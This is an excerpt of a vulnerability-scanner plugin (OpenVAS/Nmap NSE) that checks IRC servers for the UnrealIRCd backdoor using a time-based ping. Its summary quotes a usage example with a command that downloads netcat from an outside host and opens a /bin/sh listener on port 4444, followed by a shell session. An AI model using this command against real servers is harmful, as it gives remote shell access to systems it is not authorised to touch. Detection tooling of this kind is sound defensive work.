...
# $Id: gb_nmap_irc_unrealircd_backdoor_net.nasl 10 2013-10-27 10:03:59Z jan $
#
...
tag_summary = "Checks if an IRC server is backdoored by running a time-based command (ping) and checking how long
it takes to respond.
...
netcat listener as demonstrated here: '   $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse
--script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x
./nc && ./nc -l -p 4444 -e /bin/sh' <target>   $ ncat -vv localhost 4444   Ncat: Version 5.30BETA1 (
http://nmap.org/ncat )   Ncat: Connected to 127.0.0.1:4444.   pwd
/home/ron/downloads/Unreal3.2-bad   whoami   ron '
...
if(description)
{
    ...
    script_summary("Nmap NSE net: irc-unrealircd-backdoor");
